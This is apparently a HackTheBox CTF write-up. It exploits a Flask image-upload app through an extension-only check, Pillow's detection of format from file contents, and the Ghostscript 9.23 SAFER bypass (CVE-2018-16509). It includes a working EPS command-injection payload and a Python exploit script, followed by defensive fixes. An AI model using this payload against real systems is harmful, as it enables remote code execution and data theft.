---
title: "petpet rcbee"
date: 2027-03-12 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, file-upload, rce, pillow, ghostscript, cve-2018-16509]
description: "An Easy Web challenge that turns a cute 'pet your image' resizer into unauthenticated RCE: the upload allowlists the file extension, but Pillow picks its decoder from the file contents — so a .png that is really an EPS gets rendered by a vulnerable Ghostscript and runs your shell command."
---

## Overview

**petpet rcbee** is an Easy HackTheBox **Web** challenge. The app lets you upload an
image and "pets" it (overlays a bouncing bee, returns an animated GIF). The upload
endpoint only checks the file **extension** — but the image is opened with Pillow,
which decides the format from the file's **contents**. Feed it an EPS named `pwn.png`
and Pillow hands it to a bundled **Ghostscript 9.23**, whose `-dSAFER` sandbox is
bypassable ([CVE-2018-16509](https://nvd.nist.gov/vuln/detail/CVE-2018-16509)) for
unauthenticated remote code execution.

## The technique

The vulnerability is an [unrestricted upload validated by the wrong property](https://cwe.mitre.org/data/definitions/434.html)
chained into [code injection](https://cwe.mitre.org/data/definitions/94.html) through
an image library that sniffs content.

Reading `util.py`:

```python
ALLOWED_EXTENSIONS = set(['png', 'jpg', 'jpeg'])

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def petpet(file):
    if not allowed_file(file.filename):          # (1) extension check ONLY
        return {'status': 'failed', ...}, 400
    tmp_path = save_tmp(file)
    bee = Image.open(tmp_path).convert('RGBA')   # (2) Pillow opens by CONTENT
    ...
```

Two facts collide:

1. `allowed_file()` trusts the *name* — `pwn.png` passes.
2. `Image.open()` ignores the name and reads the *magic bytes*. A file whose bytes
   begin with `%!PS-Adobe` is an EPS, so Pillow's `EpsImagePlugin` runs — and that
   plugin renders EPS by shelling out to the system **Ghostscript**.

The `Dockerfile` confirms the target: it `pip install`s Pillow and downloads
**Ghostscript 9.23**, which is vulnerable to
[CVE-2018-16509](https://nvd.nist.gov/vuln/detail/CVE-2018-16509). A crafted EPS
escapes the `-dSAFER` sandbox by undefining `setpagedevice`, walking the
`legal`/`restore` operators, then opening an output **pipe** that Ghostscript runs
through `popen()` (i.e. `/bin/sh -c`):

```postscript
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: 0 0 100 100
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%<shell command>) currentdevice putdeviceprops
```

The `%%BoundingBox` line is required so Pillow accepts the EPS. The RCE is **blind**
(Ghostscript's output is discarded and the upload then errors), so we exfil through
the web root: Flask serves `application/static/` at `/static/`, and the upload folder
`application/static/petpets/` is web-readable. Copy the flag there, then fetch it —
no outbound connection needed.

## Solution

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys, requests, time
host, port = sys.argv[1], sys.argv[2]
base = f"http://{host}:{port}"
OUT = "pwned_flag.txt"

CMD = (f"cat /app/flag /flag /flag.txt 2>/dev/null > /app/application/static/petpets/{OUT}; "
       f"find / -maxdepth 4 -iname 'flag*' -type f -exec cat {{}} + 2>/dev/null "
       f">> /app/application/static/petpets/{OUT}")

EPS = ("%!PS-Adobe-3.0 EPSF-3.0\n%%BoundingBox: 0 0 100 100\n%%Pages: 0\n%%EndComments\n"
       "userdict /setpagedevice undef\nsave\nlegal\n"
       "{ null restore } stopped { pop } if\n{ legal } stopped { pop } if\nrestore\n"
       f"mark /OutputFile (%pipe%{CMD}) currentdevice putdeviceprops\n")

requests.post(f"{base}/api/upload",
              files={"file": ("pwn.png", EPS, "image/png")}, timeout=30)

for _ in range(10):
    r = requests.get(f"{base}/static/petpets/{OUT}", timeout=15)
    if r.status_code == 200 and r.text.strip():
        print(r.text.strip()); break
    time.sleep(1.5)
```

Run it against the spawned instance:

```bash
python3 solve.py <target-host> <target-port>
# -> HTB{...}
```

The upload disguised as `pwn.png` is rendered by Ghostscript, the `cp` runs as the
web user, and the flag pops out of `/static/petpets/pwned_flag.txt`.

## Why it worked

An extension allowlist is not a content control. Pillow (like ImageMagick) selects
its decoder from the file's magic bytes, so the `.png` requirement never stopped an
EPS from reaching the EPS code path. Once there, Ghostscript 9.23 does the rest —
and crucially, **keeping `-dSAFER` enabled does not help** on gs ≤ 9.23, because the
sandbox itself is bypassed by [CVE-2018-16509](https://nvd.nist.gov/vuln/detail/CVE-2018-16509).

## Fix / defense

- **Upgrade Ghostscript ≥ 9.24** (patches the SAFER bypass). Default `-dSAFER` is not
  sufficient on ≤ 9.23.
- **Disable the EPS/PS delegate** in Pillow / ImageMagick (ImageMagick `policy.xml`:
  deny the `PS`, `EPS`, and `PDF` coders).
- **Validate by content, not extension:** re-encode the upload through a safe raster
  decoder and reject anything whose magic bytes aren't a real raster image.
- **Sandbox image processing:** least privilege, no egress, no sensitive files
  readable — so even a decoder RCE can't reach the flag.
